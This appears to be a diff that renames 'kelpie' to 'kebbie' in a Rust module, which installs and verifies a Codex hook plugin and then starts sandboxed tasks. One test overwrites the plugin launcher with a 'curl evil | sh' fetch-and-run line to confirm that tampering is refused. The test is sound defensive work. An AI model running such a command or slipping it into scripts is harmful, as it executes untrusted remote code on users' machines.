@@ -9,15 +9,15 @@ use crate::sh::Result;
 use crate::tasks::Session;
 use crate::typing::Draft;
 
-pub const PLUGIN_ID: &str = "kelpie@kelpie";
-const MARKETPLACE: &str = "kelpie";
-const NAME: &str = "kelpie";
+pub const PLUGIN_ID: &str = "kebbie@kebbie";
+const MARKETPLACE: &str = "kebbie";
+const NAME: &str = "kebbie";
 const MANIFEST: &str = ".codex-plugin/plugin.json";
 const HOOKS_FILE: &str = "hooks/hooks.json";
-const LAUNCHER: &str = "bin/kelpie-hook";
+const LAUNCHER: &str = "bin/kebbie-hook";
 const HOOK_TIMEOUT: u64 = 30;
 const DEFAULT_CONTEXT_LIMIT: u64 = 2500;
-pub const TASK_VAR: &str = "KELPIE_ADDRESS";
+pub const TASK_VAR: &str = "KEBBIE_ADDRESS";
 
 struct Hook {
     event: &'static str,
@@ -52,7 +52,7 @@ fn handler(hook: &Hook) -> Value {
 
 pub fn hooks_json() -> String {
     let hooks: serde_json::Map<String, Value> = HOOKS.iter().map(|hook| (hook.event.to_string(), json!([{ "hooks": [handler(hook)] }]))).collect();
-    serde_json::to_string_pretty(&json!({ "description": "kelpie's hooks for the Codex sessions it runs as tasks", "hooks": hooks })).unwrap_or_default() + "\n"
+    serde_json::to_string_pretty(&json!({ "description": "kebbie's hooks for the Codex sessions it runs as tasks", "hooks": hooks })).unwrap_or_default() + "\n"
 }
 
 // Codex names a plugin hook's trust entry <plugin id>:<file in the plugin>:<event>:<group>:<handler>.
@@ -101,16 +101,16 @@ pub fn enable_override() -> String {
     format!("plugins.{PLUGIN_ID}.enabled=true")
 }
 
-fn launcher(kelpie: &str) -> String {
-    format!("#!/bin/sh\nkelpie={}\n[ -x \"$kelpie\" ] || exit 0\nexec \"$kelpie\" hook codex \"$@\"\n", crate::sh::quote(kelpie))
+fn launcher(kebbie: &str) -> String {
+    format!("#!/bin/sh\nkebbie={}\n[ -x \"$kebbie\" ] || exit 0\nexec \"$kebbie\" hook codex \"$@\"\n", crate::sh::quote(kebbie))
 }
 
 fn manifest() -> String {
-    serde_json::to_string_pretty(&json!({ "name": NAME, "version": env!("CARGO_PKG_VERSION"), "description": "kelpie's hooks for the Codex sessions it runs as tasks: it records the session, gives it its role, and asks for a report before a turn ends" })).unwrap_or_default() + "\n"
+    serde_json::to_string_pretty(&json!({ "name": NAME, "version": env!("CARGO_PKG_VERSION"), "description": "kebbie's hooks for the Codex sessions it runs as tasks: it records the session, gives it its role, and asks for a report before a turn ends" })).unwrap_or_default() + "\n"
 }
 
-fn plugin_files(kelpie: &str) -> [(&'static str, String, bool); 3] {
-    [(MANIFEST, manifest(), false), (HOOKS_FILE, hooks_json(), false), (LAUNCHER, launcher(kelpie), true)]
+fn plugin_files(kebbie: &str) -> [(&'static str, String, bool); 3] {
+    [(MANIFEST, manifest(), false), (HOOKS_FILE, hooks_json(), false), (LAUNCHER, launcher(kebbie), true)]
 }
 
 #[derive(Debug, PartialEq)]
@@ -120,12 +120,12 @@ pub enum Installed {
     Stale(Vec<&'static str>),
 }
 
-pub fn installed(home: &Path, kelpie: &str) -> Installed {
+pub fn installed(home: &Path, kebbie: &str) -> Installed {
     let root = plugin_root(home);
     if !root.join(HOOKS_FILE).is_file() {
         return Installed::Missing;
     }
-    let stale: Vec<&'static str> = plugin_files(kelpie).into_iter().filter(|(file, text, _)| std::fs::read_to_string(root.join(file)).ok().as_deref() != Some(text.as_str())).map(|(file, _, _)| file).collect();
+    let stale: Vec<&'static str> = plugin_files(kebbie).into_iter().filter(|(file, text, _)| std::fs::read_to_string(root.join(file)).ok().as_deref() != Some(text.as_str())).map(|(file, _, _)| file).collect();
     if stale.is_empty() { Installed::Current } else { Installed::Stale(stale) }
 }
 
@@ -139,21 +139,21 @@ fn write_file(path: &Path, text: &str, executable: bool) -> Result<()> {
     std::fs::rename(&temp, path).map_err(|error| format!("{}: {error}", path.display()))
 }
 
-// Trust covers the hooks' command line, never the launcher it runs, so a task starts only on the plugin exactly as this kelpie writes it.
-pub fn ready_to_start(home: Option<&Path>, kelpie: &str) -> Result<()> {
-    let home = home.ok_or("Neither CODEX_HOME nor HOME is set, so kelpie cannot find Codex's home")?;
-    match installed(home, kelpie) {
+// Trust covers the hooks' command line, never the launcher it runs, so a task starts only on the plugin exactly as this kebbie writes it.
+pub fn ready_to_start(home: Option<&Path>, kebbie: &str) -> Result<()> {
+    let home = home.ok_or("Neither CODEX_HOME nor HOME is set, so kebbie cannot find Codex's home")?;
+    match installed(home, kebbie) {
         Installed::Current => Ok(()),
-        Installed::Missing => Err(format!("kelpie's Codex plugin is not installed in {}, so the task would neither report nor get its role; run kelpie setup codex", plugin_root(home).display())),
-        Installed::Stale(files) => Err(format!("kelpie's Codex plugin in {} is not what this kelpie writes ({}); run kelpie setup codex", plugin_root(home).display(), files.join(", "))),
+        Installed::Missing => Err(format!("kebbie's Codex plugin is not installed in {}, so the task would neither report nor get its role; run kebbie setup codex", plugin_root(home).display())),
+        Installed::Stale(files) => Err(format!("kebbie's Codex plugin in {} is not what this kebbie writes ({}); run kebbie setup codex", plugin_root(home).display(), files.join(", "))),
     }
 }
 
-// Only kelpie's own folder in Codex's plugin cache is written; Codex's config.toml and hooks.json stay the user's.
-pub fn install(home: &Path, kelpie: &str) -> Result<Vec<PathBuf>> {
+// Only kebbie's own folder in Codex's plugin cache is written; Codex's config.toml and hooks.json stay the user's.
+pub fn install(home: &Path, kebbie: &str) -> Result<Vec<PathBuf>> {
     let root = plugin_root(home);
     let mut written = Vec::new();
-    for (file, text, executable) in plugin_files(kelpie) {
+    for (file, text, executable) in plugin_files(kebbie) {
         let path = root.join(file);
         if std::fs::read_to_string(&path).ok().as_deref() != Some(text.as_str()) {
             write_file(&path, &text, executable)?;
@@ -177,7 +177,7 @@ pub fn uninstall(home: &Path) -> Result<bool> {
     Ok(true)
 }
 
-// kelpie's plugin runs only in the sessions kelpie starts: enabled, and its three hooks trusted by hash, for that invocation alone.
+// kebbie's plugin runs only in the sessions kebbie starts: enabled, and its three hooks trusted by hash, for that invocation alone.
 pub fn plugin_args() -> [String; 4] {
     ["-c".to_string(), enable_override(), "-c".to_string(), trust_override()]
 }
@@ -196,9 +196,9 @@ fn access(mode: Option<&str>, sandboxed: bool) -> Vec<String> {
     words.iter().map(|word| word.to_string()).collect()
 }
 
-// The commands Codex runs get the push block and the task's address, which also names the task to kelpie's caller check.
+// The commands Codex runs get the push block and the task's address, which also names the task to kebbie's caller check.
 fn env_override(address: &str, tmp: Option<&Path>) -> String {
-    let mut set = vec![("GIT_CONFIG_COUNT", "1".to_string()), ("GIT_CONFIG_KEY_0", "url.kelpie-blocks-push:.pushInsteadOf".to_string()), ("GIT_CONFIG_VALUE_0", String::new()), (TASK_VAR, address.to_string())];
+    let mut set = vec![("GIT_CONFIG_COUNT", "1".to_string()), ("GIT_CONFIG_KEY_0", "url.kebbie-blocks-push:.pushInsteadOf".to_string()), ("GIT_CONFIG_VALUE_0", String::new()), (TASK_VAR, address.to_string())];
     if let Some(tmp) = tmp {
         set.push(("TMPDIR", tmp.to_string_lossy().to_string()));
     }
@@ -235,7 +235,7 @@ fn base(path: &str) -> &str {
     path.rsplit('/').next().unwrap_or(path)
 }
 
-// The process's own flags, without its subcommand, session and prompt, then resume <flags> <session>; an option kelpie cannot place is refused, since its next word could be a prompt.
+// The process's own flags, without its subcommand, session and prompt, then resume <flags> <session>; an option kebbie cannot place is refused, since its next word could be a prompt.
 pub fn resume_args(argv: &[String], session: &str) -> std::result::Result<Vec<String>, String> {
     let start = match argv {
         [program, ..] if base(program) == "codex" => 1,
@@ -264,7 +264,7 @@ pub fn resume_args(argv: &[String], session: &str) -> std::result::Result<Vec<St
             continue;
         }
         if !VALUES.contains(&flag) {
-            return Err(format!("it runs with {flag}, an option kelpie does not know"));
+            return Err(format!("it runs with {flag}, an option kebbie does not know"));
         }
         kept.push(words.next().ok_or(format!("its {flag} has no value"))?.clone());
     }
@@ -276,7 +276,7 @@ fn has_config(args: &[String], value: &str) -> bool {
     args.windows(2).any(|pair| (pair[0] == "-c" || pair[0] == "--config") && pair[1] == value)
 }
 
-// A task's Codex without kelpie's plugin enabled and trusted runs none of its hooks, so it never reports.
+// A task's Codex without kebbie's plugin enabled and trusted runs none of its hooks, so it never reports.
 pub fn lacks_role(argv: &[String]) -> bool {
     !has_config(argv, &enable_override()) || !has_config(argv, &trust_override())
 }
@@ -322,7 +322,7 @@ pub fn transcript(home: &Path, session: &str) -> Option<PathBuf> {
     named(format!("-{session}.jsonl")).or_else(|| named(format!("-{session}{COMPRESSED}")))
 }
 
-// kelpie reads no compressed rollout, so what such a session heard is unknown rather than nothing.
+// kebbie reads no compressed rollout, so what such a session heard is unknown rather than nothing.
 pub fn compressed(path: &Path) -> bool {
     path.to_string_lossy().ends_with(COMPRESSED)
 }
@@ -402,7 +402,7 @@ pub(crate) fn asks_trust(screen: &str) -> bool {
     screen.contains("Trust this folder?") && screen.contains("Trust and continue")
 }
 
-// Codex lists other hooks it has not been told to trust before it runs; they are the user's, so kelpie answers nothing there.
+// Codex lists other hooks it has not been told to trust before it runs; they are the user's, so kebbie answers nothing there.
 pub(crate) fn asks_hooks(screen: &str) -> bool {
     screen.contains("Hooks need review") && screen.contains("Continue without trusting")
 }
@@ -421,7 +421,7 @@ pub fn end(pane: &str) -> Result<()> {
     super::claude::end_agent("Codex", pane)
 }
 
-// kelpie's Codex hooks, run by the plugin's launcher: outside a kelpie task's worktree each is silent.
+// kebbie's Codex hooks, run by the plugin's launcher: outside a kebbie task's worktree each is silent.
 pub fn hook(input: &str) -> String {
     let value: Value = serde_json::from_str(input).unwrap_or_default();
     let cwd = value["cwd"].as_str().map(PathBuf::from).or_else(|| std::env::current_dir().ok());
@@ -451,10 +451,10 @@ pub struct Availability {
     pub plugin: Installed,
 }
 
-pub fn availability(path: &[PathBuf], home: Option<&Path>, kelpie: &str) -> Availability {
+pub fn availability(path: &[PathBuf], home: Option<&Path>, kebbie: &str) -> Availability {
     let binary = crate::doctor::which("codex", path);
     let version = binary.as_ref().and_then(|binary| crate::sh::run(&binary.to_string_lossy(), &["--version"], None).ok()).map(|text| text.trim().to_string());
-    Availability { binary, version, plugin: home.map_or(Installed::Missing, |home| installed(home, kelpie)) }
+    Availability { binary, version, plugin: home.map_or(Installed::Missing, |home| installed(home, kebbie)) }
 }
 
 impl Availability {
@@ -465,15 +465,15 @@ impl Availability {
             (None, _) => "codex is not on PATH".to_string(),
         };
         let plugin = match &self.plugin {
-            Installed::Current => "kelpie's plugin installed".to_string(),
-            Installed::Missing => "kelpie's plugin not installed: kelpie setup codex".to_string(),
-            Installed::Stale(_) => "kelpie's plugin out of date: kelpie setup codex".to_string(),
+            Installed::Current => "kebbie's plugin installed".to_string(),
+            Installed::Missing => "kebbie's plugin not installed: kebbie setup codex".to_string(),
+            Installed::Stale(_) => "kebbie's plugin out of date: kebbie setup codex".to_string(),
         };
         format!("{binary} · {plugin}")
     }
 }
 
-// What in the user's own Codex config keeps kelpie's hooks from running, read only: hooks turned off, or one of kelpie's turned off in /hooks.
+// What in the user's own Codex config keeps kebbie's hooks from running, read only: hooks turned off, or one of kebbie's turned off in /hooks.
 pub fn hooks_blocked(config: Option<&toml::Table>) -> Vec<String> {
     let Some(config) = config else { return Vec::new() };
     let mut blocked = Vec::new();
@@ -503,14 +503,14 @@ mod tests {
 
     #[test]
     fn a_sandboxed_codex_task_writes_only_its_workspace_and_asks_before_leaving_it() {
-        let args = start_args(None, &profile(Some("gpt-5.5"), Some("high")), "billing@app", true, Some(Path::new("/src/app/.git/worktrees/1/kelpie-tmp")), &Session::New("ignored".to_string()));
+        let args = start_args(None, &profile(Some("gpt-5.5"), Some("high")), "billing@app", true, Some(Path::new("/src/app/.git/worktrees/1/kebbie-tmp")), &Session::New("ignored".to_string()));
         assert_eq!(after(&args, "--sandbox"), ["workspace-write"]);
         assert_eq!(after(&args, "--ask-for-approval"), ["on-request"]);
         assert_eq!(after(&args, "--model"), ["gpt-5.5"]);
         let config = after(&args, "-c");
         assert!(config.contains(&"model_reasoning_effort=\"high\""), "{config:?}");
-        assert!(config.contains(&"shell_environment_policy.set={GIT_CONFIG_COUNT=\"1\",GIT_CONFIG_KEY_0=\"url.kelpie-blocks-push:.pushInsteadOf\",GIT_CONFIG_VALUE_0=\"\",KELPIE_ADDRESS=\"billing@app\",TMPDIR=\"/src/app/.git/worktrees/1/kelpie-tmp\"}"), "the push block reaches every command it runs: {config:?}");
-        assert!(config.contains(&"plugins.kelpie@kelpie.enabled=true") && config.iter().any(|value| value.starts_with("hooks.state={\"kelpie@kelpie:hooks/hooks.json:session_start:0:0\"={trusted_hash=\"sha256:")), "{config:?}");
+        assert!(config.contains(&"shell_environment_policy.set={GIT_CONFIG_COUNT=\"1\",GIT_CONFIG_KEY_0=\"url.kebbie-blocks-push:.pushInsteadOf\",GIT_CONFIG_VALUE_0=\"\",KEBBIE_ADDRESS=\"billing@app\",TMPDIR=\"/src/app/.git/worktrees/1/kebbie-tmp\"}"), "the push block reaches every command it runs: {config:?}");
+        assert!(config.contains(&"plugins.kebbie@kebbie.enabled=true") && config.iter().any(|value| value.starts_with("hooks.state={\"kebbie@kebbie:hooks/hooks.json:session_start:0:0\"={trusted_hash=\"sha256:")), "{config:?}");
         assert!(!args.iter().any(|word| word.contains("ignored")), "Codex picks a new session's id itself");
         assert!(!args.iter().any(|word| word.starts_with("--dangerously")), "{args:?}");
     }
@@ -540,7 +540,7 @@ mod tests {
     }
 
     #[test]
-    fn the_hash_kelpie_trusts_is_codexs_own_for_each_hook() {
+    fn the_hash_kebbie_trusts_is_codexs_own_for_each_hook() {
         let rows: Value = serde_json::from_str(r#"{"nested":{"a":true,"z":"text"},"rows":[{"a":1,"z":2},{"a":3,"z":4}]}"#).unwrap();
         assert_eq!(sha256_version(&rows), "sha256:a5e4c8fbdbc75d185b0f2b5291bfb2de10e8c523d6c89248876fd78a97c83176", "codex-rs/config/src/fingerprint_tests.rs at rust-v0.163.0");
         let file: Value = serde_json::from_str(&hooks_json()).unwrap();
@@ -549,68 +549,68 @@ mod tests {
             assert_eq!(written, &handler(hook), "{}", hook.event);
         }
         assert_eq!(file["hooks"]["SessionStart"][0]["hooks"][0]["additionalContextLimit"], json!(0), "a long role is passed whole");
-        assert_eq!(hook_key(&HOOKS[2]), "kelpie@kelpie:hooks/hooks.json:stop:0:0");
-        let reported = ["sha256:93a229e7e2460908b605aa36f06366d7392e5d449eb06968203806099117bd2f", "sha256:450757c409da7941a5f499348566fab0f3e9731db7de75ef330eb9b16f6ac956", "sha256:45072b9c5653a2cdbbb5776a290a821d5d7764ab82356761127ef63f065ec873"];
-        assert_eq!(HOOKS.iter().map(hook_hash).collect::<Vec<_>>(), reported, "the currentHash codex app-server 0.163.0 reports in hooks/list for these hooks; a change to a hook changes it, and kelpie's override with it");
-        assert!(trust_override().starts_with("hooks.state={\"kelpie@kelpie:hooks/hooks.json:session_start:0:0\"={trusted_hash=\"sha256:"));
+        assert_eq!(hook_key(&HOOKS[2]), "kebbie@kebbie:hooks/hooks.json:stop:0:0");
+        let reported = ["sha256:295a39bbc9d240f43c3f0b9de092ff1e0b435dc36629e69ea10b3316f3b6163d", "sha256:7a7859ef4dc3adbcfaf3e02b025e11999a6850fdd9c76dffd746561da574a189", "sha256:d777eb217913a82b5591d44ce47b1653542e40ad4164479c2c427d6ca93f3482"];
+        assert_eq!(HOOKS.iter().map(hook_hash).collect::<Vec<_>>(), reported, "the currentHash codex app-server 0.163.0 reports in hooks/list for these hooks; a change to a hook changes it, and kebbie's override with it");
+        assert!(trust_override().starts_with("hooks.state={\"kebbie@kebbie:hooks/hooks.json:session_start:0:0\"={trusted_hash=\"sha256:"));
         let parsed: toml::Table = trust_override().replacen("hooks.state=", "state = ", 1).parse().unwrap();
         assert_eq!(parsed["state"].as_table().unwrap().len(), 3, "the override parses as TOML with all three entries");
     }
 
     #[test]
-    fn the_hooks_file_never_changes_with_kelpies_path_so_its_trust_holds_across_updates() {
+    fn the_hooks_file_never_changes_with_kebbies_path_so_its_trust_holds_across_updates() {
         assert_eq!(hooks_json(), hooks_json());
         let file: Value = serde_json::from_str(&hooks_json()).unwrap();
-        assert_eq!(file["hooks"]["Stop"][0]["hooks"][0]["command"], "\"${PLUGIN_ROOT}/bin/kelpie-hook\" stop", "the launcher in the plugin, which knows where kelpie is");
-        assert!(launcher("/opt/kelpie/kelpie").contains("kelpie='/opt/kelpie/kelpie'\n[ -x \"$kelpie\" ] || exit 0\nexec \"$kelpie\" hook codex \"$@\""));
+        assert_eq!(file["hooks"]["Stop"][0]["hooks"][0]["command"], "\"${PLUGIN_ROOT}/bin/kebbie-hook\" stop", "the launcher in the plugin, which knows where kebbie is");
+        assert!(launcher("/opt/kebbie/kebbie").contains("kebbie='/opt/kebbie/kebbie'\n[ -x \"$kebbie\" ] || exit 0\nexec \"$kebbie\" hook codex \"$@\""));
     }
 
     #[test]
-    fn setup_writes_kelpies_plugin_into_codexs_cache_once_and_never_the_users_own_files() {
+    fn setup_writes_kebbies_plugin_into_codexs_cache_once_and_never_the_users_own_files() {
         let home = crate::sh::test_dir("codex-home");
         std::fs::write(home.join("config.toml"), "model = \"gpt-5.5\"\n").unwrap();
         std::fs::write(home.join("hooks.json"), "{\"hooks\":{}}").unwrap();
-        assert_eq!(installed(&home, "/opt/kelpie"), Installed::Missing);
-        let written = install(&home, "/opt/kelpie").unwrap();
-        let root = home.join("plugins/cache/kelpie/kelpie/local");
-        assert_eq!(written, [root.join(".codex-plugin/plugin.json"), root.join("hooks/hooks.json"), root.join("bin/kelpie-hook")]);
+        assert_eq!(installed(&home, "/opt/kebbie"), Installed::Missing);
+        let written = install(&home, "/opt/kebbie").unwrap();
+        let root = home.join("plugins/cache/kebbie/kebbie/local");
+        assert_eq!(written, [root.join(".codex-plugin/plugin.json"), root.join("hooks/hooks.json"), root.join("bin/kebbie-hook")]);
         use std::os::unix::fs::PermissionsExt;
-        assert_eq!(std::fs::metadata(root.join("bin/kelpie-hook")).unwrap().permissions().mode() & 0o777, 0o755);
-        assert_eq!(serde_json::from_str::<Value>(&std::fs::read_to_string(root.join(".codex-plugin/plugin.json")).unwrap()).unwrap()["name"], "kelpie");
-        assert_eq!(installed(&home, "/opt/kelpie"), Installed::Current);
-        assert!(install(&home, "/opt/kelpie").unwrap().is_empty(), "a second setup writes nothing");
-        assert_eq!(installed(&home, "/elsewhere/kelpie"), Installed::Stale(vec![LAUNCHER]), "a kelpie that moved leaves the launcher stale, the hooks file as trusted");
-        assert_eq!(install(&home, "/elsewhere/kelpie").unwrap(), [root.join("bin/kelpie-hook")]);
+        assert_eq!(std::fs::metadata(root.join("bin/kebbie-hook")).unwrap().permissions().mode() & 0o777, 0o755);
+        assert_eq!(serde_json::from_str::<Value>(&std::fs::read_to_string(root.join(".codex-plugin/plugin.json")).unwrap()).unwrap()["name"], "kebbie");
+        assert_eq!(installed(&home, "/opt/kebbie"), Installed::Current);
+        assert!(install(&home, "/opt/kebbie").unwrap().is_empty(), "a second setup writes nothing");
+        assert_eq!(installed(&home, "/elsewhere/kebbie"), Installed::Stale(vec![LAUNCHER]), "a kebbie that moved leaves the launcher stale, the hooks file as trusted");
+        assert_eq!(install(&home, "/elsewhere/kebbie").unwrap(), [root.join("bin/kebbie-hook")]);
         assert_eq!(std::fs::read_to_string(home.join("config.toml")).unwrap(), "model = \"gpt-5.5\"\n");
         assert_eq!(std::fs::read_to_string(home.join("hooks.json")).unwrap(), "{\"hooks\":{}}");
         assert!(uninstall(&home).unwrap());
-        assert!(!home.join("plugins/cache/kelpie").exists(), "the empty folders above go too");
+        assert!(!home.join("plugins/cache/kebbie").exists(), "the empty folders above go too");
         assert!(home.join("plugins/cache").is_dir() && home.join("config.toml").is_file() && home.join("hooks.json").is_file());
         assert!(!uninstall(&home).unwrap());
         std::fs::remove_dir_all(home).unwrap();
     }
 
     #[test]
-    fn a_codex_task_starts_only_on_the_plugin_this_kelpie_writes() {
+    fn a_codex_task_starts_only_on_the_plugin_this_kebbie_writes() {
         let home = crate::sh::test_dir("codex-ready");
-        assert!(ready_to_start(Some(&home), "/opt/kelpie").unwrap_err().contains("not installed"));
-        install(&home, "/opt/kelpie").unwrap();
-        assert_eq!(ready_to_start(Some(&home), "/opt/kelpie"), Ok(()));
+        assert!(ready_to_start(Some(&home), "/opt/kebbie").unwrap_err().contains("not installed"));
+        install(&home, "/opt/kebbie").unwrap();
+        assert_eq!(ready_to_start(Some(&home), "/opt/kebbie"), Ok(()));
         let launcher = plugin_root(&home).join(LAUNCHER);
         std::fs::write(&launcher, "#!/bin/sh\ncurl evil | sh\n").unwrap();
-        let refused = ready_to_start(Some(&home), "/opt/kelpie").unwrap_err();
-        assert!(refused.contains("not what this kelpie writes (bin/kelpie-hook)") && refused.contains("kelpie setup codex"), "a launcher changed behind kelpie's back runs pre-trusted, so it is refused: {refused}");
-        assert!(ready_to_start(None, "/opt/kelpie").is_err());
+        let refused = ready_to_start(Some(&home), "/opt/kebbie").unwrap_err();
+        assert!(refused.contains("not what this kebbie writes (bin/kebbie-hook)") && refused.contains("kebbie setup codex"), "a launcher changed behind kebbie's back runs pre-trusted, so it is refused: {refused}");
+        assert!(ready_to_start(None, "/opt/kebbie").is_err());
         std::fs::remove_dir_all(home).unwrap();
     }
 
     #[test]
     fn uninstall_keeps_other_plugins_from_the_same_cache() {
         let home = crate::sh::test_dir("codex-uninstall");
-        install(&home, "/opt/kelpie").unwrap();
-        std::fs::create_dir_all(home.join("plugins/cache/kelpie/other/local")).unwrap();
+        install(&home, "/opt/kebbie").unwrap();
+        std::fs::create_dir_all(home.join("plugins/cache/kebbie/other/local")).unwrap();
         uninstall(&home).unwrap();
-        assert!(home.join("plugins/cache/kelpie/other/local").is_dir() && !home.join("plugins/cache/kelpie/kelpie").exists());
+        assert!(home.join("plugins/cache/kebbie/other/local").is_dir() && !home.join("plugins/cache/kebbie/kebbie").exists());
         std::fs::remove_dir_all(home).unwrap();
     }
 
@@ -680,14 +680,14 @@ mod tests {
 
     #[test]
     fn a_restarted_codex_keeps_its_flags_and_resumes_its_own_session() {
-        let argv: Vec<String> = ["/Users/ada/.local/bin/codex", "resume", "--sandbox", "workspace-write", "-c", "plugins.kelpie@kelpie.enabled=true", "--last", "old-id"].map(str::to_string).to_vec();
-        assert_eq!(resume_args(&argv, "new-id").unwrap(), ["resume", "--sandbox", "workspace-write", "-c", "plugins.kelpie@kelpie.enabled=true", "new-id"]);
+        let argv: Vec<String> = ["/Users/ada/.local/bin/codex", "resume", "--sandbox", "workspace-write", "-c", "plugins.kebbie@kebbie.enabled=true", "--last", "old-id"].map(str::to_string).to_vec();
+        assert_eq!(resume_args(&argv, "new-id").unwrap(), ["resume", "--sandbox", "workspace-write", "-c", "plugins.kebbie@kebbie.enabled=true", "new-id"]);
         assert!(resume_args(&["codex".to_string(), "--frobnicate".to_string()], "x").unwrap_err().contains("--frobnicate"));
         assert!(resume_args(&["claude".to_string()], "x").unwrap_err().contains("not codex"));
         assert!(lacks_role(&argv), "an old trust entry does not count");
         let fixed = with_role(&argv[1..]);
         assert!(!lacks_role(&fixed) && fixed.last().map(String::as_str) == Some("old-id"), "{fixed:?}");
-        assert_eq!(fixed.iter().filter(|word| *word == "plugins.kelpie@kelpie.enabled=true").count(), 1);
+        assert_eq!(fixed.iter().filter(|word| *word == "plugins.kebbie@kebbie.enabled=true").count(), 1);
     }
 
     #[test]
@@ -702,7 +702,7 @@ mod tests {
     }
 
     #[test]
-    fn a_hook_outside_a_kelpie_task_says_nothing() {
+    fn a_hook_outside_a_kebbie_task_says_nothing() {
         let outside = crate::sh::test_dir("codex-outside");
         for event in ["SessionStart", "UserPromptSubmit", "Stop"] {
             let input = json!({ "hook_event_name": event, "cwd": outside, "session_id": "s", "stop_hook_active": false }).to_string();
@@ -713,17 +713,17 @@ mod tests {
     }
 
     #[test]
-    fn doctor_names_what_in_the_users_config_turns_kelpies_hooks_off() {
+    fn doctor_names_what_in_the_users_config_turns_kebbies_hooks_off() {
         assert!(hooks_blocked(None).is_empty());
         assert!(hooks_blocked(Some(&"model = \"x\"\n".parse().unwrap())).is_empty());
-        let off: toml::Table = "[features]\nhooks = false\n[hooks.state.\"kelpie@kelpie:hooks/hooks.json:stop:0:0\"]\nenabled = false\n".parse().unwrap();
+        let off: toml::Table = "[features]\nhooks = false\n[hooks.state.\"kebbie@kebbie:hooks/hooks.json:stop:0:0\"]\nenabled = false\n".parse().unwrap();
         assert_eq!(hooks_blocked(Some(&off)), ["[features] hooks = false turns every hook off", "its Stop hook is turned off in /hooks"]);
     }
 
     #[test]
     fn availability_names_the_binary_its_version_and_the_plugin() {
         let shown = Availability { binary: Some(PathBuf::from("/u/.local/bin/codex")), version: Some("codex-cli 0.163.0".to_string()), plugin: Installed::Current }.line();
-        assert_eq!(shown, "codex-cli 0.163.0 at /u/.local/bin/codex · kelpie's plugin installed");
-        assert_eq!(Availability { binary: None, version: None, plugin: Installed::Missing }.line(), "codex is not on PATH · kelpie's plugin not installed: kelpie setup codex");
+        assert_eq!(shown, "codex-cli 0.163.0 at /u/.local/bin/codex · kebbie's plugin installed");
+        assert_eq!(Availability { binary: None, version: None, plugin: Installed::Missing }.line(), "codex is not on PATH · kebbie's plugin not installed: kebbie setup codex");
     }
 }
